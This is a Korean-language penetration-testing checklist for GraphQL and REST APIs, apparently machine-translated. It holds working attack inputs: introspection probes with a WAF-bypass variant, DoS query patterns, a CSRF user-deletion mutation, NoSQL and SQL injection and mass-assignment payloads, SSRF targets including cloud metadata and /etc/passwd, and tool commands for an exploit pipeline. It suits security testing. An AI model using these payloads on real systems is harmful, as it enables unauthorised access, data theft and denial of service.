# REST + GraphQL 깊이 테스트

## GraphQL 보안 테스트 전체 체크리스트

### 자체 검사 프로브(레벨 3 다운그레이드)

```graphql
 # 레벨 1 — 표준 인트로스펙션
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# 레벨 2 — 단순화된 자체 검사(WAF 우회)
{ __schema { types { name } } }

 # 레벨 3 — 최소 탐지
{ __type(name: "Query") { name } }
```

### DoS 공격 벡터

```graphql
 # 별칭 과부하
query { a1: __typename a2: __typename ... a100: __typename }

 # 배치 쿼리 과부하
[query1, query2, ..., query10]

 # 순환 쿼리
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

 # 지시문 과부하
query { __typename @skip(if: false) @include(if: true) ... }
```

### 인증 테스트

```graphql
 # GET mutation(CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

 # 배치 쿼리 인증 우회
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API 심도 테스트

### 메소드 조작 매트릭스

| 끝점| GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ 접근 가능| 테스트 재정의 생성| 테스트 배치 범위| 테스트 필드 주입| 테스트 연속 삭제| 정보 유출|
| /users/me | 벤치마크| — | 자기 승격 테스트| 테스트 필드 추가| 자체 삭제 테스트| — |

### 매개변수 주입

```json
// NoSQL 지원
{"username": {"$gt": ""}, "password": {"$ne": ""}}

 // 배치 weight 할당
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// 매개변수 오염
GET /api/users?role=user&role=admin

// JSON 배열 주입
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### API를 통한 SSRF

```
일반적인 SSRF 매개변수: webhook_url, callback_url, Avatar_url, import_url,
                redirect_uri, file_url, proxy_url, image_url
테스트: http://169.254.169.254/latest/meta-data/(AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## 자동화 도구 체인

### 베스파시아누스(교통 중심 사양 생성)

```bash
# 헤드리스 브라우저에서 크롤링
vespasian crawl --url https://target.com --depth 3

# Burp/HAR에서 가져오기
vespasian import --file traffic.har

# OpenAPI 3.0 + GraphQL SDL 내보내기
vespasian export --format openapi3 --output api-spec.yaml
```

### 엔트로피(LLM 공격 생성)

```bash
# 사양 기반 자동화 테스트
entropy --spec api-spec.yaml --live --persona all

# 5명의 동시 성격:
# - 악성 내부자: IDOR/일괄 할당/권한 에스컬레이션
# - bot_swarm: 속도 제한 우회/DoS/자동 남용
# - 침투_테스터: 주입/인증 우회
# - impatient_consumer: 경쟁 조건/오류 처리
# - 혼란스러운_사용자: 예상치 못한 입력/경계 테스트

# CI 모드
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8단계 파이프라인)

```bash
# 1~3단계: GraphQL 정찰 → 착취 → 폭발
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# 4단계: REST 학대
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# 7단계: 속도 제한 우회
./api.sh rate-bypass https://target.com/api

# 8단계: 스키마 수집
./api.sh schema-harvest https://target.com
```

Source: OWASP API 상위 10위, Praetorian Vespasian, Entropy, FireTail GraphQL
